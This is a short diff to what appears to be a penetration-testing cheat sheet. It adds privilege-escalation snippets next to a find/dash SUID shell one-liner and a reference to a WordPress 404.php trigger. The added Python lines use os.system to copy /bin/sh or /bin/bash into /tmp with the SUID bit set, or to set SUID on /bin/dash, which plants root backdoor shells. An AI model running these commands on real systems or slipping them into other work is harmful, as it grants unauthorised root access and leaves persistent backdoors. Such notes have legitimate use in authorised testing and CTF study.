@@ -61,10 +61,16 @@ if (isset($_GET['trigger'])) {
 }
 Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
 ```
-Binaries
+Binaries (and examples)
 ```
 /usr/bin/dash -p
 Path: /usr/bin/find. Exp: find . -exec /bin/sh -p \; -quit
+
+import os
+os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
+os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
+os.system('chmod u+s /bin/dash')
+
 ```
 
 LinPEAS
